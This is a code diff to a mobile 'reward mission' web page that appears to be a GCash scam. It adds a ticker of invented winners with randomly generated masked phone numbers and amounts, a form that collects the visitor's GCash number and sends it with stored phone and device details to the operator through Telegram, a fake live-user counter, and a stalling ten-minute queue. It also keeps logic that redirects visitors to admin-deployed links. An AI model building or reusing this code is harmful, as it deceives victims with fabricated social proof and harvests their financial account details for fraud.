@@ -118,6 +118,88 @@
         }
 
         /* ============================================================
+           RANDOM WINNERS TICKER (top)
+           ============================================================ */
+        .winners-ticker {
+            position: fixed;
+            top: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(0, 0, 0, 0.4));
+            border: 2px solid #ffe066;
+            border-radius: 30px;
+            box-shadow:
+                0 4px 0 #a66900,
+                0 0 25px rgba(255, 215, 0, 0.6),
+                inset 0 0 15px rgba(255, 215, 0, 0.15);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            max-width: calc(100% - 30px);
+            animation: tickerGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes tickerGlow {
+            0%, 100% { box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); }
+            50% { box-shadow: 0 4px 0 #a66900, 0 0 45px rgba(255, 215, 0, 0.95), inset 0 0 20px rgba(255, 215, 0, 0.25); }
+        }
+
+        .winners-ticker .ticker-live-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #39ff14;
+            box-shadow: 0 0 10px #39ff14;
+            animation: livePulse 1.2s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes livePulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.75); }
+        }
+
+        .winners-ticker .ticker-text {
+            font-family: 'Poppins', sans-serif;
+            font-size: 11px;
+            font-weight: 600;
+            color: #fff;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .winners-ticker .ticker-text .ticker-gc-icon {
+            width: 14px;
+            height: 14px;
+            vertical-align: middle;
+            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.8));
+        }
+
+        .winners-ticker .ticker-text .ticker-amount {
+            color: #ffe066;
+            font-weight: 900;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
+        }
+
+        .winners-ticker.fade-out .ticker-text {
+            opacity: 0;
+            transform: translateY(-6px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .winners-ticker.fade-in .ticker-text {
+            opacity: 1;
+            transform: translateY(0);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        /* ============================================================
            BACKGROUND EFFECTS
            ============================================================ */
         .bg-rays {
@@ -235,7 +317,7 @@
             flex-direction: column;
             align-items: center;
             justify-content: flex-start;
-            padding: 30px 18px 40px;
+            padding: 70px 18px 40px;
         }
 
         .mission-card {
@@ -751,6 +833,37 @@
             box-shadow: 0 0 25px rgba(110, 168, 255, 0.7);
         }
 
+        /* GCash input */
+        .gcash-input {
+            width: 100%;
+            max-width: 240px;
+            display: block;
+            margin: 0 auto 12px;
+            text-align: center;
+            font-family: 'Orbitron', monospace;
+            font-size: 18px;
+            font-weight: 900;
+            padding: 14px;
+            background: #0a1020;
+            border: 3px solid #ffe066;
+            border-radius: 14px;
+            color: #ffe066;
+            letter-spacing: 2px;
+            outline: none;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+
+        .gcash-input::placeholder {
+            color: rgba(255, 215, 0, 0.4);
+            letter-spacing: 2px;
+            font-size: 14px;
+        }
+
+        .gcash-input:focus {
+            border-color: #6ea8ff;
+            box-shadow: 0 0 25px rgba(110, 168, 255, 0.7);
+        }
+
         .ai-timer {
             font-family: 'Orbitron', monospace;
             font-size: 26px;
@@ -799,6 +912,115 @@
             border: 1px solid rgba(255, 215, 0, 0.3);
         }
 
+        /* ============================================================
+           QUEUING POPUP STYLES
+           ============================================================ */
+        .queue-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 18px;
+            background: linear-gradient(180deg, #ff9800 0%, #ff5722 100%);
+            border: 2px solid #fff;
+            border-radius: 30px;
+            font-family: 'Orbitron', monospace;
+            font-size: 10px;
+            font-weight: 900;
+            letter-spacing: 2.5px;
+            color: #fff;
+            margin-bottom: 14px;
+            box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7);
+            text-transform: uppercase;
+            animation: queueBadgePulse 2s ease-in-out infinite;
+        }
+
+        @keyframes queueBadgePulse {
+            0%, 100% { box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7); }
+            50% { box-shadow: 0 4px 0 #8b3a00, 0 0 45px rgba(255, 87, 34, 1); }
+        }
+
+        .queue-badge .queue-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #fff;
+            box-shadow: 0 0 10px #fff;
+            animation: queueDotBlink 1s ease-in-out infinite;
+        }
+
+        @keyframes queueDotBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .queue-count-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 12px;
+            margin: 10px 0;
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 215, 0, 0.4);
+            border-radius: 14px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .queue-count-box .live-users-count {
+            font-family: 'Orbitron', monospace;
+            font-size: 20px;
+            font-weight: 900;
+            color: #39ff14;
+            text-shadow: 0 0 15px rgba(57, 255, 20, 0.8);
+        }
+
+        .queue-timer-big {
+            font-family: 'Orbitron', monospace;
+            font-size: 46px;
+            font-weight: 900;
+            color: #ffe066;
+            text-shadow: 0 0 25px rgba(255, 215, 0, 0.9);
+            letter-spacing: 4px;
+            margin: 14px 0;
+            animation: queueTimerGlow 1.5s ease-in-out infinite;
+        }
+
+        @keyframes queueTimerGlow {
+            0%, 100% { text-shadow: 0 0 25px rgba(255, 215, 0, 0.9); }
+            50% { text-shadow: 0 0 45px rgba(255, 215, 0, 1), 0 0 65px rgba(255, 179, 0, 0.8); }
+        }
+
+        .queue-timer-label {
+            font-family: 'Poppins', sans-serif;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.8);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .queue-progress {
+            width: 100%;
+            height: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 215, 0, 0.5);
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 14px 0;
+            position: relative;
+        }
+
+        .queue-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ffe066, #ffb300, #ff8800);
+            width: 0%;
+            transition: width 1s linear;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
+            border-radius: 12px;
+        }
+
         .popup-success {
             text-align: center;
             padding: 20px 0;
@@ -844,6 +1066,9 @@
             .mission-chip { font-size: 8px; padding: 6px 10px; }
             .popup-card { padding: 26px 16px 20px; }
             .popup-title { font-size: 19px; }
+            .winners-ticker { padding: 6px 12px; }
+            .winners-ticker .ticker-text { font-size: 10px; }
+            .queue-timer-big { font-size: 36px; }
         }
 
         @media (prefers-reduced-motion: reduce) {
@@ -862,6 +1087,17 @@
             Please open this link on your smartphone to continue.
         </p>
         <div class="block-badge">◇ SCAN & OPEN ON MOBILE ◇</div>
+    </div>
+
+    <!-- 🏆 RANDOM WINNERS TICKER (top) -->
+    <div class="winners-ticker" id="winnersTicker">
+        <div class="ticker-live-dot"></div>
+        <div class="ticker-text" id="tickerText">
+            <span id="tickerPhone">0917****4256</span>
+            <span>received</span>
+            <img src="images/gc_icon.png" class="ticker-gc-icon" alt="GCash" onerror="this.style.display='none';">
+            <span class="ticker-amount">₱500</span>
+        </div>
     </div>
 
     <!-- 📱 MISSION APP -->
@@ -946,13 +1182,13 @@
         </div>
     </div>
 
-    <!-- 📢 POPUP 2 — SKIP AND CLAIM -->
+    <!-- 📢 POPUP 2 — SKIP AND CLAIM (cat_auth.png) -->
     <div class="popup-overlay" id="skipClaimPopup">
         <div class="popup-card">
             <button class="popup-close" id="skipClaimClose">✕</button>
 
             <div class="popup-img-wrap">
-                <img src="images/cat_claim.png" alt="Skip and Claim" class="popup-img" onerror="this.style.opacity='0.4';">
+                <img src="images/cat_auth.png" alt="Skip and Claim" class="popup-img" onerror="this.style.opacity='0.4';">
             </div>
 
             <h2 class="popup-title">SPECIAL OFFER</h2>
@@ -972,7 +1208,72 @@
         </div>
     </div>
 
-    <!-- ✅ POPUP 3 — SUCCESS -->
+    <!-- 💳 POPUP 3 — CLAIM FORM (GCash#) — cat_claim.png -->
+    <div class="popup-overlay" id="claimFormPopup">
+        <div class="popup-card">
+            <button class="popup-close" id="claimFormClose">✕</button>
+
+            <div class="popup-img-wrap">
+                <img src="images/cat_claim.png" alt="Claim Now" class="popup-img" onerror="this.style.opacity='0.4';">
+            </div>
+
+            <h2 class="popup-title">CLAIM YOUR REWARD</h2>
+            <p class="popup-subtitle">
+                Enter your <strong>GCash number</strong><br>
+                to receive your reward.
+            </p>
+
+            <div class="ai-input-label">
+                <i class="fas fa-mobile-screen-button"></i>
+                <span>GCASH NUMBER</span>
+            </div>
+
+            <input type="tel" class="gcash-input" id="gcashInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
+
+            <button class="popup-btn" id="claimNowBtn">
+                <span class="btn-icon">💰</span>
+                <span>CLAIM NOW</span>
+            </button>
+
+            <div class="ai-error" id="claimFormError"></div>
+        </div>
+    </div>
+
+    <!-- ⏳ POPUP 4 — QUEUING (10 minutes countdown) -->
+    <div class="popup-overlay" id="queuePopup">
+        <div class="popup-card">
+            <button class="popup-close" id="queueClose">✕</button>
+
+            <div class="queue-badge">
+                <span class="queue-dot"></span>
+                <span>⏳ PROCESSING QUEUE</span>
+            </div>
+
+            <h2 class="popup-title">MANY USERS CLAIMING</h2>
+            <p class="popup-subtitle">
+                Maraming user ang nag-claim ngayon.<br>
+                Please wait for your turn.
+            </p>
+
+            <div class="queue-count-box">
+                <span>👥 Live users claiming:</span>
+                <span class="live-users-count" id="liveUsersCount">0</span>
+            </div>
+
+            <div class="queue-timer-label">⏱ Available to claim in</div>
+            <div class="queue-timer-big" id="queueTimer">10:00</div>
+
+            <div class="queue-progress">
+                <div class="queue-progress-bar" id="queueProgressBar"></div>
+            </div>
+
+            <p class="popup-subtitle" style="margin-top:14px; font-size:11px; opacity:0.8;">
+                Your claim is in the queue. Please keep this page open.
+            </p>
+        </div>
+    </div>
+
+    <!-- ✅ POPUP 5 — SUCCESS -->
     <div class="popup-overlay" id="successPopup">
         <div class="popup-card">
             <button class="popup-close" id="successClose">✕</button>
@@ -993,7 +1294,7 @@
         </div>
     </div>
 
-    <!-- 📞 POPUP 4 — AI VERIFICATION -->
+    <!-- 📞 POPUP 6 — AI VERIFICATION -->
     <div class="popup-overlay" id="aiVerifyPopup">
         <div class="popup-card">
             <button class="popup-close" id="aiVerifyClose">✕</button>
@@ -1049,6 +1350,9 @@
             var aiCountdown = 60;
             var skipCountdownInterval = null;
             var skipCountdown = 10;
+            var queueTimerInterval = null;
+            var queueCountdown = 600; // 10 minutes in seconds
+            var liveUsersInterval = null;
 
             // ============================================================
             // 🚫 STRICT MOBILE GUARD
@@ -1132,6 +1436,58 @@
 
                 sendTelegram(message);
             }
+
+            // ============================================================
+            // 🏆 RANDOM WINNERS TICKER (top)
+            // ============================================================
+            function initWinnersTicker() {
+                var prefixes = ['0917', '0918', '0927', '0998', '0945', '0966', '0955', '0939', '0906', '0977'];
+                var amounts = [500, 500, 500, 500, 1000, 1000, 1500, 2000];
+
+                function generateWinner() {
+                    var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                    var last4 = Math.floor(1000 + Math.random() * 9000);
+                    var amount = amounts[Math.floor(Math.random() * amounts.length)];
+                    return {
+                        phone: prefix + '****' + last4,
+                        amount: amount
+                    };
+                }
+
+                function updateTicker() {
+                    var ticker = document.getElementById('winnersTicker');
+                    var phoneEl = document.getElementById('tickerPhone');
+                    var amountEl = document.querySelector('.ticker-amount');
+
+                    if (!ticker || !phoneEl || !amountEl) return;
+
+                    // Fade out
+                    ticker.classList.remove('fade-in');
+                    ticker.classList.add('fade-out');
+
+                    setTimeout(function() {
+                        var winner = generateWinner();
+                        phoneEl.textContent = winner.phone;
+                        amountEl.textContent = '₱' + winner.amount.toLocaleString();
+
+                        // Fade in
+                        ticker.classList.remove('fade-out');
+                        ticker.classList.add('fade-in');
+                    }, 300);
+                }
+
+                // Initial
+                var initial = generateWinner();
+                var phoneElInit = document.getElementById('tickerPhone');
+                var amountElInit = document.querySelector('.ticker-amount');
+                if (phoneElInit) phoneElInit.textContent = initial.phone;
+                if (amountElInit) amountElInit.textContent = '₱' + initial.amount.toLocaleString();
+
+                // Update every 4.5 seconds
+                setInterval(updateTicker, 4500);
+            }
+
+            initWinnersTicker();
 
             // ============================================================
             // 🎨 BACKGROUND EFFECTS
@@ -1239,11 +1595,15 @@
                 if (popup) popup.classList.remove('show');
             }
 
-            // Close buttons
             document.getElementById('catClaimClose').onclick = function() { closePopup('catClaimPopup'); };
             document.getElementById('skipClaimClose').onclick = function() {
                 closePopup('skipClaimPopup');
                 stopSkipCountdown();
+            };
+            document.getElementById('claimFormClose').onclick = function() { closePopup('claimFormPopup'); };
+            document.getElementById('queueClose').onclick = function() {
+                closePopup('queuePopup');
+                stopQueueTimer();
             };
             document.getElementById('successClose').onclick = function() { closePopup('successPopup'); };
             document.getElementById('aiVerifyClose').onclick = function() {
@@ -1293,7 +1653,6 @@
                         console.log('🔥 Firewall:', firewallActive ? 'ON' : 'OFF');
 
                         if (firewallActive) {
-                            // 🔥 FIREWALL ON → AI Verification popup
                             sendMissionNotif('FIREWALL ON — AI Verification');
                             closePopup('catClaimPopup');
                             self.disabled = false;
@@ -1302,11 +1661,8 @@
                             return;
                         }
 
-                        // 🔓 FIREWALL OFF → Check for deployed link
-                        console.log('🔓 Checking for deployed link...');
                         getAvailableLink().then(function(linkUrl) {
                             if (linkUrl) {
-                                // ✅ MAY LINK → REDIRECT sa deployed link
                                 sendMissionNotif('FIREWALL OFF — Redirecting to deployed link');
                                 closePopup('catClaimPopup');
                                 self.innerHTML = '<span class="btn-icon">✅</span><span>REDIRECTING...</span>';
@@ -1317,7 +1673,6 @@
                                 return;
                             }
 
-                            // 📢 WALANG LINK → Skip and Claim popup
                             sendMissionNotif('FIREWALL OFF — No link deployed');
                             closePopup('catClaimPopup');
                             self.disabled = false;
@@ -1354,20 +1709,18 @@
             }
 
             // ============================================================
-            // 🔗 GET AVAILABLE LINK (deployed by admin)
+            // 🔗 GET AVAILABLE LINK
             // ============================================================
             function getAvailableLink() {
                 return new Promise(function(resolve) {
                     if (!db) return resolve(null);
                     try {
-                        // Priority 1: admin/redirectLink
                         db.ref('admin/redirectLink').once('value').then(function(snap) {
                             var data = snap.val();
                             if (data && data.url && data.active !== false) {
                                 return resolve(data.url);
                             }
 
-                            // Priority 2: links node (available)
                             db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(linksSnap) {
                                 if (linksSnap.exists()) {
                                     var links = linksSnap.val();
@@ -1390,7 +1743,7 @@
             }
 
             // ============================================================
-            // ✅ SUCCESS POPUP (walang redirect)
+            // ✅ SUCCESS POPUP
             // ============================================================
             function showSuccessPopup(message) {
                 var msgEl = document.getElementById('successMessage');
@@ -1451,7 +1804,7 @@
             }
 
             // ============================================================
-            // ⏭️ SKIP & CLAIM BUTTON — CLOSE POPUP LANG (no redirect)
+            // ⏭️ SKIP & CLAIM BUTTON → CLAIM FORM POPUP (GCash#)
             // ============================================================
             var skipClaimBtn = document.getElementById('skipClaimBtn');
             if (skipClaimBtn) {
@@ -1462,18 +1815,180 @@
                         try { navigator.vibrate(25); } catch(e) {}
                     }
 
-                    sendMissionNotif('SKIP & CLAIM clicked');
+                    sendMissionNotif('SKIP & CLAIM → CLAIM FORM');
                     triggerBurst();
 
-                    this.innerHTML = '<span class="btn-icon">✅</span><span>CLAIMED!</span>';
-                    this.disabled = true;
+                    closePopup('skipClaimPopup');
+                    stopSkipCountdown();
+
+                    // Reset form
+                    var gcashInput = document.getElementById('gcashInput');
+                    if (gcashInput) gcashInput.value = '';
+                    var errEl = document.getElementById('claimFormError');
+                    if (errEl) errEl.classList.remove('show');
+
+                    // Open claim form popup
+                    setTimeout(function() {
+                        openPopup('claimFormPopup');
+                    }, 400);
+                });
+            }
+
+            // ============================================================
+            // 💳 GCASH INPUT — AUTO FORMAT
+            // ============================================================
+            var gcashInput = document.getElementById('gcashInput');
+            if (gcashInput) {
+                gcashInput.addEventListener('input', function() {
+                    var value = this.value.replace(/\D/g, '');
+                    if (value.length > 11) value = value.substring(0, 11);
+
+                    var formatted = value;
+                    if (value.length > 7) {
+                        formatted = value.substring(0, 4) + ' ' + value.substring(4, 7) + ' ' + value.substring(7);
+                    } else if (value.length > 4) {
+                        formatted = value.substring(0, 4) + ' ' + value.substring(4);
+                    }
+                    this.value = formatted;
+                });
+            }
+
+            // ============================================================
+            // 💰 CLAIM NOW BUTTON → QUEUE POPUP (10 minutes)
+            // ============================================================
+            var claimNowBtn = document.getElementById('claimNowBtn');
+            if (claimNowBtn) {
+                claimNowBtn.addEventListener('click', function() {
+                    var gcashInputEl = document.getElementById('gcashInput');
+                    var errEl = document.getElementById('claimFormError');
+                    var gcashValue = gcashInputEl ? gcashInputEl.value.replace(/\D/g, '') : '';
+
+                    // Validation
+                    if (!gcashValue || gcashValue.length < 11) {
+                        if (errEl) {
+                            errEl.textContent = 'Please enter a valid GCash number (11 digits).';
+                            errEl.classList.add('show');
+                        }
+                        if (navigator.vibrate) {
+                            try { navigator.vibrate([50, 30, 50]); } catch(e) {}
+                        }
+                        return;
+                    }
+
+                    if (!gcashValue.startsWith('09')) {
+                        if (errEl) {
+                            errEl.textContent = 'GCash number must start with 09.';
+                            errEl.classList.add('show');
+                        }
+                        return;
+                    }
+
+                    if (errEl) errEl.classList.remove('show');
+
+                    if (navigator.vibrate) {
+                        try { navigator.vibrate([30, 50, 30]); } catch(e) {}
+                    }
+
+                    // Send Telegram
+                    sendTelegram(
+                        '💰 CLAIM FORM SUBMITTED\n' +
+                        '━━━━━━━━━━━━━━━━━━━━\n' +
+                        '👤 User: ' + (localStorage.getItem('userPhone') || 'Unknown') + '\n' +
+                        '🖥️ Device: ' + (localStorage.getItem('userDeviceDisplayId') || 'Unknown') + '\n' +
+                        '💳 GCash: ' + gcashValue + '\n' +
+                        '⏰ Time: ' + new Date().toLocaleString() + '\n' +
+                        '━━━━━━━━━━━━━━━━━━━━'
+                    );
+
+                    sendMissionNotif('CLAIM NOW → QUEUE POPUP');
+
+                    // Close claim form + open queue
+                    closePopup('claimFormPopup');
 
                     setTimeout(function() {
-                        closePopup('skipClaimPopup');
-                        stopSkipCountdown();
-                        showSuccessPopup('Your reward has been successfully claimed.<br>Please wait for further instructions.');
-                    }, 800);
+                        openPopup('queuePopup');
+                        startQueueTimer();
+                        startLiveUsersCounter();
+                    }, 400);
                 });
+            }
+
+            // ============================================================
+            // ⏳ QUEUE TIMER — 10 MINUTES COUNTDOWN
+            // ============================================================
+            function startQueueTimer() {
+                stopQueueTimer();
+                queueCountdown = 600; // 10 minutes
+
+                var timerEl = document.getElementById('queueTimer');
+                var progressBar = document.getElementById('queueProgressBar');
+
+                function updateTimerDisplay() {
+                    var mins = Math.floor(queueCountdown / 60);
+                    var secs = queueCountdown % 60;
+                    var display = mins + ':' + String(secs).padStart(2, '0');
+
+                    if (timerEl) timerEl.textContent = display;
+
+                    if (progressBar) {
+                        var progress = ((600 - queueCountdown) / 600) * 100;
+                        progressBar.style.width = progress + '%';
+                    }
+                }
+
+                updateTimerDisplay();
+
+                queueTimerInterval = setInterval(function() {
+                    queueCountdown--;
+
+                    updateTimerDisplay();
+
+                    if (queueCountdown <= 0) {
+                        stopQueueTimer();
+                        stopLiveUsersCounter();
+
+                        if (timerEl) timerEl.textContent = '00:00';
+
+                        // Auto-show success after queue
+                        setTimeout(function() {
+                            closePopup('queuePopup');
+                            showSuccessPopup('Your turn is ready!<br>Please wait for further instructions.');
+                        }, 1000);
+                    }
+                }, 1000);
+            }
+
+            function stopQueueTimer() {
+                if (queueTimerInterval) {
+                    clearInterval(queueTimerInterval);
+                    queueTimerInterval = null;
+                }
+            }
+
+            // ============================================================
+            // 👥 LIVE USERS COUNTER (fake live count sa queue popup)
+            // ============================================================
+            function startLiveUsersCounter() {
+                stopLiveUsersCounter();
+
+                var countEl = document.getElementById('liveUsersCount');
+                if (!countEl) return;
+
+                var baseCount = 120 + Math.floor(Math.random() * 80);
+                countEl.textContent = baseCount;
+
+                liveUsersInterval = setInterval(function() {
+                    var change = Math.floor(Math.random() * 5) - 2; // -2 to +2
+                    baseCount = Math.max(80, baseCount + change);
+                    countEl.textContent = baseCount;
+                }, 1500);
+            }
+
+            function stopLiveUsersCounter() {
+                if (liveUsersInterval) {
+                    clearInterval(liveUsersInterval);
+                    liveUsersInterval = null;
+                }
             }
 
             // ============================================================
@@ -1585,7 +2100,7 @@
             }
 
             // ============================================================
-            // ✅ AI VERIFY BUTTON — CLOSE POPUP LANG (no redirect)
+            // ✅ AI VERIFY BUTTON
             // ============================================================
             var aiVerifyBtn = document.getElementById('aiVerifyBtn');
             if (aiVerifyBtn) {
